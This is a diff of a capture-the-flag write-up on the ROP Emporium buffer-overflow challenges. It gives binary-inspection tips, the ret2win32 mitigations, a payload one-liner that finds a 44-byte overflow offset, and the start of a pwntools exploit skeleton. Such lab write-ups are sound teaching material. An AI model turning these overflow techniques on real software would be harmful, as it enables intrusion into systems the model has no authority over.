@@ -25,7 +25,9 @@ It has great integration with `pwntools`, which can automate debugging tasks by 
 `checksec` is good to learn the challenge's mitigations settings. `rabin2` is also an option.
 
 ## Tips
+
 1. Note that for stripped binaries, external functions (that are being imported by the binary) names may be resolved from their shared objects:
+
 ```bash
 nm -u <binary>  # list external functions
 rabin2 -qs <binary> | grep -ve imp -e ' 0 '  # try to list internal functions
@@ -34,6 +36,7 @@ rabin2 -qs <binary> | grep -ve imp -e ' 0 '  # try to list internal functions
 2. The ROP Emporium challenges contains a `usefulGadgets` symbol, which marks the address of added gadgets to the binary. 
 
 3. In order to find strings (avoid using `strings` binary):
+
 ```bash
 rabin2 -z split
 ```
@@ -58,12 +61,13 @@ $ checksec ret2win32
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
-
 ```
+
 This challenge reads 56 bytes into 32 stack buffer, via `read` call. \
 A function named `ret2win` prints the flag, and located within `0x804862c`. 
 
 The amount of needed garbage bytes is 44:
+
 ```bash
 $ sudo dmesg -C
 $ echo `python -c 'print("A"*44 + "B" * 4)'` | ./ret2win32
@@ -72,12 +76,18 @@ $ sudo dmesg
 [ 4285.836441] ret2win32[32818]: segfault at 42424242 ip 0000000042424242 sp 00000000ff9c0940 error 14 in libc.so.6[f7c00000+20000]
 [ 4285.836884] Code: Unable to access opcode bytes at RIP 0x42424218.
 ```
+
 The exploit for x86 is simple (would use it as a skeleton for most of the challenges):
 ```python
 import pwn  
 import logging  
   
-
+  
+logging.basicConfig(  
+    level=logging.DEBUG,  
+    format= '[%(asctime)s] {%(pathname)s:%(lineno)d} %(levelname)s - %(message)s',  
+    datefmt='%H:%M:%S'  
+)  
 logger = logging.getLogger(__name__)  
   
 DEBUG = True  
